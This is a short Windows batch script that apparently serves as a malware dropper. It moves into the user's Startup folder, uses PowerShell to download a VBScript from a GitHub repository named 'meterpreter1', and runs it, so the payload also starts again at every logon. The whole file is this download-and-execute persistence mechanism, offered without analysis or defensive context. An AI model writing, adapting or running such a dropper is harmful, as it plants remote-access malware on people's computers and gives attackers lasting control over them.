@echo off
set startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

if not exist "%startupPath%" (
    echo Startup path not found: %startupPath%
) else (
    cd /d "%startupPath%"
    powershell -Command ^
        "try { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs', 'start.vbs'); Start-Process 'start.vbs' } catch { Write-Output 'Failed to download or start the file. Error: $_' }"
)
